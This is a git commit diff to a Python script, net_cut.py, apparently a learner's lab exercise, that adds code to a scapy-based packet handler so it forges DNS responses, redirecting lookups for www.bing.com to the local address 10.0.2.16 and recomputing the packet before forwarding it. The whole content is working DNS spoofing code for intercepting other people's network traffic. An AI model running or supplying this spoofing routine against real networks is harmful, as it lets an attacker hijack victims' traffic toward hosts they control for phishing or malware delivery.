b20bac1bd26382d37d3ec2d11e2f059cb74f515b
Kevin Shaji <ckevin.shaji@gmail.com>
2020-03-02 11:15:56 +0530

    Added function to modify and send crafted packet

--- net_cut.py
+++ net_cut.py
@@ -9,8 +9,16 @@ def process_packet(packet):
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16") #spoofed ip
-        print(scapy_packet.show())
-    print(scapy_packet.show())
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+            
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+            
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 
